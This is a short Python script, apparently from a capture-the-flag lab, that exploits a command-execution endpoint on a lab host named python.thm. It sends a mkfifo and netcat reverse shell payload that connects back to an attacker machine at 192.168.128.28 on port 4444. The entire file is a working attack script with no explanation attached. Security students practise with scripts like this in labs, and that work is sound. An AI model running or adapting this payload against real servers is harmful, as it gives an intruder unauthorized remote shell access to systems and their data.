import requests

# Target URL
TARGET_URL = "http://python.thm/labs/lab3/execute.php?cmd="

# Reverse shell payload (Change ATTACKBOX_IP)
payload = "rm /tmp/pipe; mkfifo /tmp/pipe;/bin/sh 0</tmp/pipe | nc 192.168.128.28 4444 1>/tmp/pipe"

print("[+] Sending reverse shell payload...")

requests.get(TARGET_URL + payload)
